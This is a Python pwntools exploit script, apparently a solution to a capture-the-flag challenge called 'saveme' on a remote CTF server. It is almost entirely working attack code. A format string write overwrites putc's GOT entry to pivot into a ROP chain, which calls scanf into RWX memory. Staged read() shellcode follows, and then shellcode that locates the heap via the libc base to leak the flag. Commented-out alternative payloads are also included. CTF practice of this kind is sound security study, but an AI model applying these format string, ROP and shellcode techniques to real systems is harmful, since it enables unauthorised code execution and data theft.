from pwn import *
from time import sleep

context.log_level = "debug"
context.arch = "amd64"

pname = "./saveme"
e = ELF(pname)
libc = ELF("./libc-2.31.so") ## access to hooks and shit, also no tcache safe linking.

sc = """ 

b *0x4014e8
command
    b *0x405000
end

"""

def main():
    #p = process(pname)
    #p = gdb.debug(pname, sc)
    p = remote("challs.ctf.sekai.team", 4001)
    #gdb.attach(p, sc)
    ## Get a stack leak that we never use :P
    p.recvuntil(": ")
    stack_leak = int(p.recv(14), 16) + 0x68
    print(hex(stack_leak))
    p.sendline("2")
    
    ## Addr of the rwx mem
    rwx = 0x00000000405000
    ## The extra padding is to make the putc address align to 8 bytes. Needed since printf wont interpret anything past null bytes 
    ## so we have to have the address at the end.
    ## What we do here is find a gadget that has like 6 pops, we can then use it to get the stack ptr pointing into our input after our fsb payload, in which there is 
    ## a ropchain.
    pload = b"%5554c" + b"%10$hn" + b"A"*4 + p64(e.got['putc']) 
    #0x00000000004015bb: pop rdi; ret; 
    pload += p64(0x4015bb)
    # 0x4021a0 - 0x4021a4  →   "%80s" 
    pload += p64(0x4021a0)
    #0x00000000004015b9: pop rsi; pop r15; ret;
    pload += p64(0x4015b9)
    pload += p64(rwx)
    pload += b"B"*8
    #pload += p64(0x4015bb+1)
    # [0x404088] __isoc99_scanf@GLIBC_2.7  →  0x401116
    pload += p64(0x401116) 
    pload += p64(rwx)


    ## stupid solutions
    #pload = b"%5369c" + b"%10$hn" + b"A"*4 + p64(e.got['putc']) 
    #pload = b"%5171c" + b"%10$hn" + b"A"*4 + p64(e.got['putc']) 
    #pload = b"%5108c" + b"%10$hn" + b"A"*4 + p64(e.got['putc']) 
    #scanf_gdg = 0x401500
    #scanf_gdg = 0x4015b5
    #pload = b"%" + str(scanf_gdg & 0xffff).encode("utf-8") + b"c" + b"%14$hn"
    #pload = b"%14$n%15$n%16$n%17$n"
    #pload += b"%" + str(((scanf_gdg & 0xffff0000) >> 16)).encode("utf-8") + b"c" + b"%15$hn"
    #pload += b"%" + str((scanf_gdg & 0xffff) - 0x40).encode("utf-8") + b"c" + b"%14$hn"
    #pload += b"A"*6 + p64(stack_leak) + p64(stack_leak+2) + p64(e.got['printf']) + p64(e.got['printf']+2) 
    #pload += p64(stack_leak) + p64(stack_leak+2) + p64(stack_leak+4) 

    p.sendlineafter("person: ", pload)

    ## should have triggered our lovely scanf now, lets send a read() shellcode so we can do any shellcode we want with no problems with badchars
    shc = asm(''' 

    mov rax, 0 
    mov rdi, 0 
    mov rsi, 0x405000 
    mov rdx, 0x4141 
    syscall


    ''')
    
    p.sendline(shc)
    
    ## v2, now with no limits. From the libc start main addr on the stack we can find the base, and then we can find the tcache address stored in the tls. The flag is 
    ## allocated after the tcache, so if we add 0x290 we should be able to write it out.
    
    shc = asm(''' 

    pop rcx
    pop rcx
    pop rcx
    pop rcx
    sub rcx, 0x240b3
    mov rsi, rcx 
    sub rsi, 0x2910
    mov rsi, qword ptr [rsi]
    add rsi, 0x290
    mov rax, 1 
    mov rdi, 1 
    mov rdx, 64 
    syscall

    ''')

    p.sendline(b"\x90"*0x20 + shc)

    p.interactive()

if __name__ == "__main__":
    main()
